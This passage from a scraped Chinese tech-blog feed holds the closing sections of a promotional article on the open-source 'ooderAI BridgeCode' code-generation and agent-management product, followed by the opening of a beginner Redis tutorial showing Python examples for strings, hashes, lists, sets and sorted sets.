<h3 data-id="heading-11">3.1 核心技术架构：ooder 表单引擎 + ooder-nlpModule 自然语言模型</h3>
<p>产品底层依托两大核心技术架构，确保代码生成的准确性、效率与灵活性，同时为Web化操作、可视化设计提供坚实支撑：</p>
<ul>
<li><strong>ooder 表单引擎</strong>：提供强大的表单设计、数据交互能力，支撑 BridgeCode Web端可视化操作界面（如流程配置、参数设置、代码调试等），界面美观、操作便捷，适配企业各类终端（电脑、平板）Web访问需求；同时支持表单数据与代码生成逻辑的无缝联动，确保操作与结果的实时同步。</li>
<li><strong>ooder-nlpModule 自然语言模型</strong>：核心支撑自学习能力与工作流程优化，能够精准识别企业技术文档、代码注释中的自然语言信息，深度理解企业编程需求与技术规范，同时支持自然语言指令操作（如通过自然语言下达代码生成、流程调整指令），降低操作门槛，让非专业开发人员也能快速上手。</li>
</ul>
<p>两大技术架构深度融合，既确保了代码生成的技术稳定性，又提升了产品的易用性与Web化适配性，实现“技术专业、操作简单”的双重优势。</p>
<h4 data-id="heading-12">3.1.1 核心技术架构</h4>
<p>以下为 ooderAI BridgeCode 核心技术架构示意图</p>
<p>​</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9422b5e39d8f445fbfa73f37d6b7a2f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=5JsSTOP4KIvwGpDVDtLfuHoF16M%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p>​</p>
<h3 data-id="heading-13">3.2 开源设计：无技术绑定，自主可控</h3>
<p>BridgeCode 采用全开源设计，彻底打破“技术绑定”壁垒，让企业拥有绝对的自主控制权，无需担心依赖第三方工具导致的升级受限、成本增加等问题，是企业长期数字化转型的可靠选择。</p>
<p>开源核心优势：</p>
<ul>
<li><strong>无技术栈绑定</strong>：支持Java、Vue、React、Python等多种主流技术栈，企业可保留现有技术栈，无需重构系统，直接适配使用；</li>
<li><strong>代码自主可控</strong>：开源全部核心代码，企业可根据自身需求进行二次开发、定制修改，优化代码生成逻辑、工作流程或Web端操作界面，贴合企业个性化需求；</li>
<li><strong>免费无门槛</strong>：核心功能完全免费，无license限制，企业无需支付高额费用即可使用全部核心能力，降低企业成本；</li>
<li><strong>社区支撑</strong>：拥有完善的开源社区，聚集大量技术开发者，企业可在社区获取技术支持、分享经验、获取最新升级包，快速解决使用过程中遇到的问题。</li>
</ul>
<h3 data-id="heading-14">3.3 全系列开源可视化工具：128个组件，助力低代码开发</h3>
<p>BridgeCode 配套提供全系列开源可视化工具，涵盖128个常用组件，打造全套前端可视化 skills 辅助低代码组件生成器，兼顾专业开发人员与非专业人员的使用需求，进一步降低企业编程门槛，提升开发效率，同时所有工具均采用Web化美化设计，界面简洁、交互流畅。</p>
<p>核心工具与组件优势：</p>
<ul>
<li><strong>组件丰富全面</strong>：128个组件覆盖前端开发、表单设计、数据可视化、交互操作等全场景，包括按钮、输入框、表格、图表、弹窗、导航等常用组件，无需人工重复开发；</li>
<li><strong>可视化低代码开发</strong>：支持拖拽式组件布局、可视化参数配置，非专业开发人员可通过简单拖拽、勾选，快速生成前端组件代码，专业开发人员可在此基础上进行优化，兼顾效率与灵活性；</li>
<li><strong>开源可扩展</strong>：所有可视化工具与组件均开源，企业可根据自身需求扩展组件功能、新增自定义组件，适配企业个性化前端开发需求；</li>
<li><strong>Web化适配</strong>：所有可视化工具均支持Web端操作，组件生成后可直接在Web端预览、修改、导出，适配企业Web端开发流程，同时支持响应式设计，适配不同屏幕尺寸。</li>
</ul>
<p>全套前端可视化 skills 同步配套，详细说明各组件的使用方法、适配场景、代码示例，辅助团队快速掌握工具使用技巧，进一步提升开发效率。</p>
<h3 data-id="heading-15">3.4 完善完整开源的 Agent 管理方案</h3>
<p>针对AI时代企业编程的智能化需求，BridgeCode 提供完善完整的开源 Agent 管理方案，实现AI Agent 的全生命周期管理，助力企业搭建智能化编程辅助体系，进一步释放AI技术的价值，同时管理方案采用Web化可视化管理界面，便于企业统一管控。</p>
<p>Agent 管理方案核心功能：</p>
<ul>
<li><strong>Agent 快速部署</strong>：提供开源的 Agent 模板，企业可快速部署适配自身需求的AI Agent（如代码审查Agent、错误排查Agent、代码优化Agent等），无需从零开发；</li>
<li><strong>全生命周期管理</strong>：支持 Agent 的创建、配置、启动、停止、更新、删除等全流程管理，Web端可视化管控界面，可实时查看 Agent 运行状态、执行日志，便于运维管理；</li>
<li><strong>个性化配置</strong>：可根据企业编程需求，自定义 Agent 的功能、执行逻辑、触发条件，让 Agent 更贴合企业实际需求；</li>
<li><strong>开源可扩展</strong>：Agent 管理方案全部开源，企业可扩展 Agent 类型、优化管理逻辑，适配企业AI化升级的长期需求，同时支持与企业现有运维管理系统无缝对接。</li>
</ul>
<h4 data-id="heading-16">3.4.1 Agent 全生命周期管理流程Web绘图</h4>
<p>以下为 BridgeCode Agent 管理方案的全生命周期流程示意图：</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7c7e3c3ec82456bb4f707ef11cfda78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=zJ4u1zkP5nISSlE7XC2R9qqt%2Bog%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<p>​</p>
<h2 data-id="heading-17">四、产品优势：对比传统方案，打造核心竞争力</h2>








































<table><thead><tr><th align="left">对比维度</th><th align="left">传统代码生成工具/方案</th><th align="left">ooderAI BridgeCode</th></tr></thead><tbody><tr><td align="left">代码生成适配性</td><td align="left">标准化模板，需人工大量修改，难以贴合企业个性化技术路线</td><td align="left">自学习能力，自动适配企业代码特点与技术路线，生成专属代码，无需二次修改</td></tr><tr><td align="left">新旧系统衔接</td><td align="left">衔接繁琐，需人工编写大量适配代码，易出现兼容问题</td><td align="left">自动生成衔接代码，无缝衔接已有应用与 ooderAI 代码，稳定无异常</td></tr><tr><td align="left">技术绑定</td><td align="left">多为闭源方案，绑定特定技术栈，升级受限</td><td align="left">全开源设计，无技术绑定，支持多技术栈适配，可自主二次开发</td></tr><tr><td align="left">可视化与易用性</td><td align="left">多为命令行操作或简单界面，可视化程度低，操作复杂</td><td align="left">全Web化美化设计，可视化操作界面，拖拽式配置，128个可视化组件辅助，易用性强</td></tr><tr><td align="left">AI时代适配性</td><td align="left">无AI自学习能力，不支持工作流程优化与 Agent 管理</td><td align="left">内置AI自学习算法，优化AI时代工作流程，提供完整开源 Agent 管理方案</td></tr><tr><td align="left">成本控制</td><td align="left">闭源方案费用高昂，二次开发成本高</td><td align="left">核心功能免费开源，无license费用，二次开发成本低，降低企业人力与资金成本</td></tr></tbody></table>
<h2 data-id="heading-18">五、适用场景：覆盖全行业企业编程需求</h2>
<p>ooderAI BridgeCode 凭借其灵活性、适配性与易用性，可广泛应用于各类规模、各类行业的企业，尤其适合面临“代码衔接困难、开发效率低下、技术栈多样、AI化转型需求迫切”的企业，核心适用场景如下：</p>
<h3 data-id="heading-19">5.1 中小企业编程效率提升</h3>
<p>中小企业团队规模小、开发人力有限，面临“一人多岗、开发周期紧张”的问题。BridgeCode 自动生成代码、简化工作流程的能力，可大幅减少手动编码工作量，让开发人员聚焦核心业务开发，同时低门槛的可视化操作的让非专业人员也能参与基础代码生成，进一步提升团队效率，降低人力成本。</p>
<h3 data-id="heading-20">5.2 大型企业技术体系衔接与标准化</h3>
<p>大型企业技术栈多样、已有系统繁杂，不同部门可能采用不同的技术路线，导致代码衔接困难、工作流程不统一。BridgeCode 支持多技术栈适配、自动生成衔接代码，可打通各部门技术断层；同时可优化工作流程、搭建标准化 skills 能力包，实现企业编程工作的标准化、规范化，提升团队协同效率。</p>
<h3 data-id="heading-21">5.3 企业AI化编程转型</h3>
<p>希望引入AI技术优化编程工作、提升智能化水平的企业，BridgeCode 提供的AI自学习能力、Agent 管理方案与AI时代工作流程优化能力，可助力企业快速搭建智能化编程体系，实现代码生成、审查、优化的智能化，推动企业编程工作向AI化转型。</p>
<h3 data-id="heading-22">5.4 低代码开发团队支撑</h3>
<p>采用低代码开发模式的企业或团队，BridgeCode 配套的128个开源可视化组件、低代码组件生成器，可进一步丰富低代码开发的组件库，降低低代码开发门槛，同时自学习能力可适配企业低代码开发规范，生成贴合企业需求的低代码组件与衔接代码，提升低代码开发效率与质量。</p>
<h3 data-id="heading-23">5.5 多技术栈协同开发场景</h3>
<p>企业内部存在多个技术栈（如前端Vue/React、后端Java/Python），团队协同开发困难的场景，BridgeCode 无技术绑定、多技术栈适配的特点，可让不同技术栈的团队共用一套工具，生成适配各自技术栈的代码，打通协同开发断层，降低沟通成本。</p>
<h2 data-id="heading-24">六、实施与支持：助力企业快速落地，长期赋能</h2>
<p>ooderAI BridgeCode 致力于为企业提供“全流程、全方位”的实施与技术支持，确保企业能够快速落地产品、熟练使用核心功能，同时依托开源社区与专业团队，为企业长期发展提供技术保障。</p>
<h3 data-id="heading-25">6.1 实施流程</h3>
<ol>
<li><strong>需求对接</strong>：专业团队对接企业，了解企业技术栈、代码特点、编程需求与痛点，制定个性化实施方案；</li>
<li><strong>产品部署</strong>：提供详细的部署文档与Web化部署指引，支持本地部署、云端部署，快速完成产品部署与环境配置；</li>
<li><strong>调试适配</strong>：协助企业完成 BridgeCode 的自学习调试，确保代码生成、系统衔接符合企业需求，优化Web端操作体验；</li>
<li><strong>培训指导</strong>：针对企业团队开展专项培训，涵盖产品核心功能、Web端操作方法、技能包使用、Agent 部署等内容，确保团队熟练上手；</li>
<li><strong>落地上线</strong>：协助企业完成产品落地上线，实时监控运行状态，及时解决上线过程中遇到的问题；</li>
<li><strong>长期优化</strong>：根据企业业务发展与技术升级需求，提供长期优化建议，协助企业进行产品二次开发与功能扩展。</li>
</ol>
<p>​</p>
<h4 data-id="heading-26">6.1.1 产品实施全流程eb绘图</h4>
<p>以下为 ooderAI BridgeCode 企业实施全流程W示意图：</p>
<p>​</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/138de841bcdf45a4bc66cf2e5b743d6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=fhcGEHO6mRQ%2B06ZTI2OqTc4TG7o%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h3 data-id="heading-27">6.2 技术支持</h3>
<ul>
<li><strong>开源社区支持</strong>：企业可在开源社区获取技术文档、操作教程、常见问题解决方案，同时可与其他企业、开发者交流经验，获取最新升级包；</li>
<li><strong>在线技术支持</strong>：提供7×12小时在线技术咨询服务，快速响应企业问题，协助解决产品使用、部署、调试过程中遇到的难题；</li>
<li><strong>定制化支持</strong>：针对企业个性化需求，提供定制化开发、流程优化、Agent 定制等服务，助力企业实现产品与业务的深度适配；</li>
<li><strong>版本升级支持</strong>：持续迭代产品版本，优化核心功能、新增组件与能力，为企业提供免费版本升级指导，确保企业始终使用最新、最优质的产品功能。</li>
</ul>
<h2 data-id="heading-28">七、未来规划：持续迭代，赋能企业AI编程新未来</h2>
<p>ooderAI BridgeCode 将始终以企业需求为核心，依托AI技术与开源生态，持续迭代优化产品功能，不断提升产品的适配性、易用性与智能化水平，助力企业在AI时代实现编程效率与质量的双重飞跃，未来规划主要聚焦以下方向：</p>
<ul>
<li><strong>AI能力升级</strong>：优化自学习算法，提升代码生成的准确性与效率，新增AI代码重构、AI需求转化（自然语言转代码）等功能，进一步释放AI技术价值；</li>
<li><strong>组件与工具扩展</strong>：持续扩充可视化组件库，计划新增至200+组件，覆盖更多开发场景；同时优化低代码组件生成器，提升可视化开发体验与灵活性；</li>
<li><strong>Web化体验优化</strong>：进一步美化Web端操作界面，新增个性化界面配置、多语言支持等功能，适配不同企业的操作习惯与需求；</li>
<li><strong>生态融合深化</strong>：加强与 ooderAI 生态的深度融合，同时对接更多主流开发工具、运维系统、云平台，打造全方位的企业编程生态体系；</li>
<li><strong>开源社区建设</strong>：扩大开源社区规模，吸引更多开发者参与产品迭代与优化，丰富社区资源，为企业提供更全面的技术支持；</li>
<li><strong>行业定制化适配</strong>：针对金融、制造、互联网、医疗等重点行业，开发行业专属模板、组件与 Agent 方案，进一步提升产品的行业适配性。</li>
</ul>
<h2 data-id="heading-29">八、结语</h2>
<p>在AI技术重塑企业编程模式的今天，高效、灵活、智能的代码框架解决方案，成为企业数字化转型的核心支撑。ooderAI BridgeCode 以“为企业快速构建属于自己的AI确定性代码框架，助力企业编程”为核心，凭借自学习的代码生成能力、AI时代的流程优化能力、开源灵活的产品特点与Web化的易用设计，打破传统代码生成方案的局限，打通企业技术断层，降低开发成本，提升编程效率，助力企业实现AI化编程转型。</p>
<p>未来，ooderAI BridgeCode 将持续迭代、不断创新，依托开源生态与专业团队，为企业提供更优质、更贴合需求的产品与服务，与企业携手，共同开启AI编程新未来，助力企业在数字化转型的道路上稳步前行。</p>
<h2 data-id="heading-30">附录：产品相关资源</h2>
<ul>
<li>开源社区地址：</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foodercn%2Fsuper-Agent" target="_blank" title="https://github.com/oodercn/super-Agent" ref="nofollow noopener noreferrer">github.com/oodercn/sup…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2FooderCN%2Fsuper-agent" target="_blank" title="https://gitee.com/ooderCN/super-agent" ref="nofollow noopener noreferrer">gitee.com/ooderCN/sup…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[全栈进阶-redis入门实战概念篇]]></title>    <link>https://juejin.cn/post/7603195960254513152</link>    <guid>https://juejin.cn/post/7603195960254513152</guid>    <pubDate>2026-02-05T12:00:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254513152" data-draft-id="7603043152673062927" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="全栈进阶-redis入门实战概念篇"/> <meta itemprop="keywords" content="Python,Redis,后端"/> <meta itemprop="datePublished" content="2026-02-05T12:00:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="只与明月听"/> <meta itemprop="url" content="https://juejin.cn/user/386661153249102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全栈进阶-redis入门实战概念篇
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/386661153249102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    只与明月听
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:00:48.000Z" title="Thu Feb 05 2026 12:00:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读28分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">第一阶段：redis基础</h2>
<h4 data-id="heading-1">1. 简介</h4>
<p><code>Redis</code>是一款开源的、基于内存的键值对数据库，支持将内存持久化到磁盘，还提供了丰富的数据结构、事务、发布订阅等功能，被广泛的用于缓存、消息队列、会话存储等场景。</p>
<p>作为一个前端开发，对于<code>Redis</code>第一影响就是读写操作非常的快，常用于一些需要快速读写数据的场景，比如存储会话<code>session</code>。<code>Redis</code>之所以这么快，在于<code>Redis</code>利用了内存操作、IO多路复用、避免线程切换开销三大核心优势，让单线程也足以支撑超高并发。</p>
<p><code>Redis</code>并非纯单线程，只是在接受客户请求的核心处理流程是单线程的，在处理慢操作，比如持久化读写磁盘、异步删除大键、主从复制的网络同步，会启动多个辅助线程。为啥当初<code>Redis</code>不是设计成多线程呢，主要是单线程设计简单，核心逻辑都是串行执行的，后续的维护成本极低，同时也避免了多线程的死锁啊，数据一致性啊这些麻烦的问题；内存的操作足够快，多线程必然会涉及到线程切换和锁竞争，这些都会降低效率；IO的多路复用，<code>Redis</code>运行在网络层，使用的基于<code>Unix</code>系统的IO多路复用机制，就是主线程通过事件循环来监听所有客户端的IO操作，维护一个事件队列去处理IO操作，这种单线程非阻塞的IO多路复用让<code>Redis</code>可以同时管理上万的<code>TCP</code>连接。</p>
<h4 data-id="heading-2">2.redis数据基本结构</h4>
<p><code>Redis</code>基本数据结构主要五个，接下来挨个介绍下</p>
<p>首先安装下环境：</p>
<pre><code class="hljs">pip install redis
</code></pre>
<p>先创建一个虚拟环境，然后安装相应的依赖</p>
<pre><code class="hljs language-ini" lang="ini">import redis
​
<span class="hljs-comment"># 连接到你的线上 Redis</span>
<span class="hljs-attr">r</span> = redis.Redis.from_url(
    "redis://:xxx",
    <span class="hljs-attr">decode_responses</span>=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># 返回 str 而不是 bytes</span>
)
​
<span class="hljs-comment"># 设置一个 study:string 的 key</span>
r.set("study:string", "hello redis from python")
​
<span class="hljs-comment"># 读出来验证一下</span>
<span class="hljs-attr">value</span> = r.get(<span class="hljs-string">"study:string"</span>)
print("study:<span class="hljs-attr">string</span> =<span class="hljs-string">", value)
</span></code></pre>
<h5 data-id="heading-3">2.1 String</h5>
<p><code>String</code>是<code>Redis</code>最基础、最常用的数据结构，所有的键值对的<code>value</code>本质上都可以使用<code>String</code>来存储，单<code>key</code>最大容量512M，所有的操作都是原子性的，支持位运算和过期策略。</p>
<p>比如前面的案例<code>r.set("study:string", "hello redis from python")</code>，就是设置一个字符串</p>
<p>如果要设置一个过期时间的话，也比较简单</p>
<p><code>r.set("study:string", "hello redis from python", ex=60)</code>，这里的<code>ex</code>就是秒数，如果是<code>px</code>就是毫秒数，这里设置的时间就表明key的过期时间，如果过期了key就会被删除。</p>
<h5 data-id="heading-4">2.1 Hash</h5>
<p><code>Hash</code>是一个键对应多个键值对的结构，类似于<code>Map</code>和字典，一般用来存储结构化的对象。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">r.hset(<span class="hljs-string">"study:hash"</span>, mapping={
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"张三"</span>,
    <span class="hljs-string">"age"</span>: <span class="hljs-string">"20"</span>,
})
​
<span class="hljs-keyword">data</span> = r.hgetall(<span class="hljs-string">"study:hash"</span>)
print(<span class="hljs-keyword">data</span>)  # {<span class="hljs-string">'name'</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-string">'age'</span>: <span class="hljs-string">'20'</span>}
</code></pre>
<p>如果要删除<code>hash</code>中的指定字段的话，可以使用这个方法<code>hdel</code></p>
<pre><code class="hljs language-arduino" lang="arduino">r.<span class="hljs-built_in">hdel</span>(<span class="hljs-string">"study:hash"</span>, <span class="hljs-string">"age"</span>)
</code></pre>
<h5 data-id="heading-5">2.3 List</h5>
<p>这里的<code>List</code>是按照插入顺序排序的字符串集合，支持两端搞笑增删，中间查询稍慢，是一个双向链表。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 从右侧依次塞入几个元素</span>
r.rpush(<span class="hljs-string">"study:list"</span>, <span class="hljs-string">"apple"</span>, <span class="hljs-string">"banana"</span>, <span class="hljs-string">"orange"</span>)
​
<span class="hljs-comment"># 从左侧再塞一个</span>
r.lpush(<span class="hljs-string">"study:list"</span>, <span class="hljs-string">"pear"</span>)   <span class="hljs-comment"># list 现在是: ["pear", "apple", "banana", "orange"]</span>
​
<span class="hljs-comment"># 读取整个 list（0 到 -1 表示所有元素）</span>
items = r.lrange(<span class="hljs-string">"study:list"</span>, 0, -1)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"study:list ="</span>, items)
​
<span class="hljs-comment"># 弹出一个元素（比如从左边弹）</span>
left = r.lpop(<span class="hljs-string">"study:list"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"lpop 之后取出的 ="</span>, left)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"剩下的 ="</span>, r.lrange(<span class="hljs-string">"study:list"</span>, 0, -1))
</code></pre>
<p>可以用来存储一些任务队列和消息队列</p>
<h5 data-id="heading-6">2.4 Set</h5>
<p><code>Set</code> 是无序、元素唯一的字符串集合，支持集合间的交、并、差运算，适合处理 “去重” 和 “关系匹配” 场景。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 往 set 里加元素（去重）</span>
r.sadd(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"apple"</span>, <span class="hljs-string">"banana"</span>, <span class="hljs-string">"orange"</span>)
r.sadd(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"banana"</span>)  <span class="hljs-comment"># 再加一次不会重复</span>
​
<span class="hljs-comment"># 查看所有成员</span>
members = r.smembers(<span class="hljs-string">"study:set"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"study:set ="</span>, members)
​
<span class="hljs-comment"># 判断某个值是否在 set 中</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"是否包含 apple:"</span>, r.sismember(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"apple"</span>))
​
<span class="hljs-comment"># 删除一个成员</span>
r.srem(<span class="hljs-string">"study:set"</span>, <span class="hljs-string">"banana"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"删除 banana 后 ="</span>, r.smembers(<span class="hljs-string">"study:set"</span>))
​
<span class="hljs-comment"># 给整个 set 设置过期时间 60 秒</span>
r.expire(<span class="hljs-string">"study:set"</span>, 60)
</code></pre>
<h5 data-id="heading-7">2.5 ZSet</h5>
<p><code>ZSet</code> 是 Set 的升级版，每个元素关联一个 “分数（score）”，Redis 会按分数从小到大排序，兼具 唯一性 和 有序性。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 往 zset 里加数据：成员 + 分数</span>
r.zadd(<span class="hljs-string">"study:zset"</span>, {
    <span class="hljs-string">"Alice"</span>: <span class="hljs-number">100</span>,
    <span class="hljs-string">"Bob"</span>: <span class="hljs-number">80</span>,
    <span class="hljs-string">"Charlie"</span>: <span class="hljs-number">95</span>,
})
​
<span class="hljs-comment"># 按分数从小到大取出所有成员</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"从小到大："</span>, r.zrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
​
<span class="hljs-comment"># 按分数从大到小取出前 2 名</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"从大到小前2名："</span>, r.zrevrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
​
<span class="hljs-comment"># 给某个人加分（比如 Alice +10）</span>
r.zincrby(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">10</span>, <span class="hljs-string">"Alice"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Alice 加分后："</span>, r.zrevrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
​
<span class="hljs-comment"># 删除一个成员</span>
r.zrem(<span class="hljs-string">"study:zset"</span>, <span class="hljs-string">"Bob"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"删除 Bob 后："</span>, r.zrange(<span class="hljs-string">"study:zset"</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, withscores=<span class="hljs-literal">True</span>))
</code></pre>
